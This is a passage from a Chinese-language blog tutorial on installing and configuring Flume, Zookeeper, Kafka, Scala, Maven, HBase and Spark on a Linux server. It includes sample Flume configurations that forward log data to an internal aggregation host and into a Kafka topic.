memory</span><br></pre></td></tr></table></figure><p>10.案例四<br>将本服务器收集到的数据发送到另外一台服务器。<br>新建配置 netcat-memory-avro.properties，监听文件内容变化，然后将新的文件内容通过 avro sink 发送到 hadoop001 这台服务器的 8888 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a1.sources = s1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a1.sources.s1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.s1.command = <span class="built_in">tail</span> -F /tmp/log.txt</span><br><span class="line">a1.sources.s1.bash = /bin/bash -c</span><br><span class="line">a1.sources.s1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sink</span></span><br><span class="line">a1.sinks.k1.type = avro</span><br><span class="line">a1.sinks.k1.hostname = hadoop001</span><br><span class="line">a1.sinks.k1.port = 8888</span><br><span class="line">a1.sinks.k1.batch-size = 1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置日志聚合Flume<br>使用 avro source 监听 hadoop001 服务器的 8888 端口，将获取到内容输出到控制台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a2.sources = s2</span><br><span class="line">a2.sinks = k2</span><br><span class="line">a2.channels = c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a2.sources.s2.type = avro</span><br><span class="line">a2.sources.s2.bind = hadoop001</span><br><span class="line">a2.sources.s2.port = 8888</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sources与channels进行绑定</span></span><br><span class="line">a2.sources.s2.channels = c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sink</span></span><br><span class="line">a2.sinks.k2.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sinks与channels进行绑定</span></span><br><span class="line">a2.sinks.k2.channel = c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a2.channels.c2.type = memory</span><br><span class="line">a2.channels.c2.capacity = 1000</span><br><span class="line">a2.channels.c2.transactionCapacity = 100</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里建议先启动a2，原因是 avro.source 会先与端口进行绑定，这样 avro sink 连接时才不会报无法连接的异常。但是即使不按顺序启动也是没关系的，sink 会一直重试，直至建立好连接。</p><h3 id="七-Zookeeper安装配置"><a href="#七-Zookeeper安装配置" class="headerlink" title="七.Zookeeper安装配置"></a>七.Zookeeper安装配置</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ZOOKEEPER_HOME</span></span><br><span class="line"><span class="built_in">export</span> ZOOKEEPER_HOME=/root/software/zookeeper-3.4.5-cdh5.6.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$ZOOKEEPER_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.新建一个目录用来存放数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/software/zookeeper-3.4.5-cdh5.6.0/zk_data</span><br></pre></td></tr></table></figure><p>3.编辑配置文件<br>复制一份配置文件,并替换内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> zoo_sample.cfg zoo.cfg</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/root/software/zookeeper-3.4.5-cdh5.6.0/zk_data</span><br></pre></td></tr></table></figure><p>4.启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkServer.sh start</span><br></pre></td></tr></table></figure><h3 id="八-kafka安装配置与使用"><a href="#八-kafka安装配置与使用" class="headerlink" title="八.kafka安装配置与使用"></a>八.kafka安装配置与使用</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#KAFKA_HOME</span></span><br><span class="line"><span class="built_in">export</span> KAFKA_HOME=/root/software/kafka_2.11-2.0.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$KAFKA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.创建日志文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/software/kafka_2.11-2.0.0/kafka-logs</span><br></pre></td></tr></table></figure><p>3.config文件夹中修改配置文件以下几项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit server.properties </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log.dirs=/root/software/kafka_2.11-2.0.0/kafka-logs</span><br><span class="line"></span><br><span class="line">listeners=PLAINTEXT://localhost:9092</span><br></pre></td></tr></table></figure><p>4.启动kafka<br>启动kafka之前要先启动zookeeper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-server-start.sh ./config/server.properties</span><br></pre></td></tr></table></figure><p>5.创建topic主题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-demo --replication-factor 1 --partitions 1</span><br></pre></td></tr></table></figure><p>6.查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --list --zookeeper localhost:2181</span><br></pre></td></tr></table></figure><p>7.生产消息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-producer.sh --broker-list localhost:9092 --topic topic-demo</span><br></pre></td></tr></table></figure><p>8.消费消息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-demo</span><br><span class="line">--beginning 可选参数,代表从头消费</span><br></pre></td></tr></table></figure><p>9.查看所有topic的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181 --describe </span><br><span class="line">--topic topic-demo 可选参数,表示指定topic</span><br></pre></td></tr></table></figure><p>10.单节点多broker</p><ul><li>修改配合文件中的id,端口,日志文件夹</li><li>启动<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-server-start.sh --deamon ./config/server.properties &amp;</span><br><span class="line">kafka-server-start.sh --deamon ./config/server2.properties &amp;</span><br><span class="line">kafka-server-start.sh --deamon ./config/server3.properties &amp;</span><br></pre></td></tr></table></figure></li><li>多副本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic my-topic-demo --replication-factor 3 --partitions 1</span><br></pre></td></tr></table></figure></li></ul><h3 id="九-安装scala"><a href="#九-安装scala" class="headerlink" title="九.安装scala"></a>九.安装scala</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># tar -zxvf scala-2.11.0.tgz </span></span><br><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SCALA_HOME</span></span><br><span class="line"><span class="built_in">export</span> SCALA_HOME=/root/software/scala-2.11.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$SCALA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># scala</span></span><br><span class="line">Welcome to Scala version 2.11.0 (Java HotSpot(TM) 64-Bit Server VM, Java 1.8.0_11).</span><br><span class="line">Type <span class="keyword">in</span> expressions to have them evaluated.</span><br><span class="line">Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">scala&gt; </span><br></pre></td></tr></table></figure><h3 id="十-安装maven"><a href="#十-安装maven" class="headerlink" title="十.安装maven"></a>十.安装maven</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software<span class="comment"># tar -zxvf apache-maven-3.8.5-bin.tar.gz</span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># mv apache-maven-3.8.5 maven-3.8.5</span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MAVEN_HOME</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/root/software/maven-3.8.5</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$MAVEN_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/maven-3.8.5<span class="comment"># mvn -v</span></span><br><span class="line">Apache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)</span><br><span class="line">Maven home: /root/software/maven-3.8.5</span><br><span class="line">Java version: 1.8.0_11, vendor: Oracle Corporation, runtime: /root/software/jdk1.8.0_11/jre</span><br><span class="line">Default locale: en_US, platform encoding: UTF-8</span><br><span class="line">OS name: <span class="string">&quot;linux&quot;</span>, version: <span class="string">&quot;5.4.0-100-generic&quot;</span>, <span class="built_in">arch</span>: <span class="string">&quot;amd64&quot;</span>, family: <span class="string">&quot;unix&quot;</span></span><br></pre></td></tr></table></figure><p>4.修改jar包存放位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/maven-3.8.5<span class="comment"># mkdir maven-repos</span></span><br><span class="line">root@ubuntu:~/software/maven-3.8.5<span class="comment"># gedit conf/settings.xml </span></span><br></pre></td></tr></table></figure><p>添加一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>/root/software/maven-3.8.5/maven-repos<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="十一-Hbase安装"><a href="#十一-Hbase安装" class="headerlink" title="十一.Hbase安装"></a>十一.Hbase安装</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># tar -zxvf hbase-1.2.0-bin.tar.gz </span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#HBASE_HOME</span></span><br><span class="line"><span class="built_in">export</span> HBASE_HOME=/root/software/hbase-1.2.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HBASE_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.编辑配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/conf<span class="comment"># gedit hbase-env.sh</span></span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#export JAVA_HOME=/usr/java/jdk1.6.0/</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export HBASE_MANAGES_ZK=true</span></span><br><span class="line"><span class="built_in">export</span> HBASE_MANAGES_ZK=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/conf<span class="comment"># gedit hbase-site.xml </span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:9000/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.master.info.port<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>60010<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/conf<span class="comment"># gedit regionservers </span></span><br></pre></td></tr></table></figure><p>为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master</span><br></pre></td></tr></table></figure><p>4.启动hbase<br>首先要先启动zeekeeper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># zkServer.sh start</span></span><br><span class="line">JMX enabled by default</span><br><span class="line">Using config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg</span><br><span class="line">Starting zookeeper ... STARTED</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># start-hbase.sh </span></span><br><span class="line">starting master, logging to /root/software/hbase-1.2.0/logs/hbase-root-master-master.out</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br><span class="line">master: starting regionserver, logging to /root/software/hbase-1.2.0/bin/../logs/hbase-root-regionserver-master.out</span><br><span class="line">master: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br><span class="line">master: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/bin<span class="comment"># jps</span></span><br><span class="line">2992 SecondaryNameNode</span><br><span class="line">4514 QuorumPeerMain</span><br><span class="line">3282 NodeManager</span><br><span class="line">6196 HRegionServer</span><br><span class="line">3143 ResourceManager</span><br><span class="line">6026 HMaster</span><br><span class="line">6330 Jps</span><br><span class="line">2636 NameNode</span><br><span class="line">2796 DataNode</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://master:60010</span><br></pre></td></tr></table></figure><p>6.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/bin<span class="comment"># hbase shell</span></span><br><span class="line"></span><br><span class="line">hbase(main):001:0&gt; version</span><br><span class="line">1.2.0, r25b281972df2f5b15c426c8963cbf77dd853a5ad, Thu Feb 18 23:01:49 CST 2016</span><br></pre></td></tr></table></figure><h3 id="十二-Spark安装"><a href="#十二-Spark安装" class="headerlink" title="十二.Spark安装"></a>十二.Spark安装</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># tar -zxvf spark-2.1.1-bin-hadoop2.7.tgz </span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SPARK_HOME</span></span><br><span class="line"><span class="built_in">export</span> SPARK_HOME=/root/software/spark-2.1.1-bin-hadoop2.7</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$SPARK_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/spark-2.1.1-bin-hadoop2.7<span class="comment"># spark-shell --version</span></span><br><span class="line">Welcome to</span><br><span class="line">      ____              __</span><br><span class="line">     / __/__  ___ _____/ /__</span><br><span class="line">    _\ \/ _ \/ _ `/ __/  <span class="string">&#x27;_/</span></span><br><span class="line"><span class="string">   /___/ .__/\_,_/_/ /_/\_\   version 2.1.1</span></span><br><span class="line"><span class="string">      /_/</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">Using Scala version 2.11.8, Java HotSpot(TM) 64-Bit Server VM, 1.8.0_11</span></span><br><span class="line"><span class="string">Branch </span></span><br><span class="line"><span class="string">Compiled by user jenkins on 2017-04-25T23:51:10Z</span></span><br><span class="line"><span class="string">Revision </span></span><br><span class="line"><span class="string">Url </span></span><br><span class="line"><span class="string">Type --help for more information.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="十三-flume对接kafka"><a href="#十三-flume对接kafka" class="headerlink" title="十三.flume对接kafka"></a>十三.flume对接kafka</h3><p>一般flume采集的方式有两种<br>1.Exec类型的Source<br>可以将命令产生的输出作为源，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1.sources.r1.type = exec</span><br><span class="line">a1.sources.r1.command = tail -F /tmp/log.txt //此处输入命令</span><br></pre></td></tr></table></figure><p>2.Spooling Directory类型的 Source<br>将指定的文件加入到“自动搜集 ”目录中。flume会持续监听这个目录，把文件当做source来处理。注意：一旦文件被放到“自动收集”目录中后，便不能修改，如果修改，flume会报错。此外，也不能有重名的文件，如果有，flume也会报错。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1.sources.r1.type = spooldir</span><br><span class="line">a1.sources.r1.spoolDir = /home/work/data</span><br></pre></td></tr></table></figure><h4 id="1-flume采集某日志文件到kafka自定义topic"><a href="#1-flume采集某日志文件到kafka自定义topic" class="headerlink" title="1.flume采集某日志文件到kafka自定义topic"></a>1.flume采集某日志文件到kafka自定义topic</h4><p>1.1 创建flume配置文件 flume-kafka-file.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义这个agent中各组件的名字</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source组件：r1</span></span><br><span class="line">a1.sources.r1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.r1.command = <span class="built_in">tail</span> -F /tmp/log.txt</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置sink组件：k1</span></span><br><span class="line">a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink</span><br><span class="line">a1.sinks.k1.kafka.topic = topic-test</span><br><span class="line">a1.sinks.k1.kafka.bootstrap.servers = localhost:9092</span><br><span class="line">a1.sinks.k1.kafka.flumeBatchSize = 20</span><br><span class="line">a1.sinks.k1.kafka.producer.acks = 1</span><br><span class="line">a1.sinks.k1.kafka.producer.linger.ms = 1</span><br><span class="line">a1.sinks.ki.kafka.producer.compression.type = snappy</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置channel组件，此处使用是内存缓存的方式</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source  channel   sink之间的连接关系</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>1.2 启动zookeeper和kafka</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./zkServer.sh start</span><br><span class="line">JMX enabled by default</span><br><span class="line">Using config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg</span><br><span class="line">Starting zookeeper ... already running as process 5452.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-server-start.sh ./config/server.properties</span><br></pre></td></tr></table></figure><p>1.3 创建topic</p><p>topic:指定topic name</p><p>partitions:指定分区数，这个参数需要根据broker数和数据量决定，正常情况下，每个broker上两个partition最好</p><p>replication-factor:副本数，建议设置为2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-test2 --replication-factor 1 --partitions 1</span><br></pre></td></tr></table></figure><p>1.4 启动kafka去消费topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-test2</span><br><span class="line">--from-beginning 可选参数,代表从头消费</span><br></pre></td></tr></table></figure><p>1.5 启动flume</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flume-ng agent -n a1 -c ./conf/ 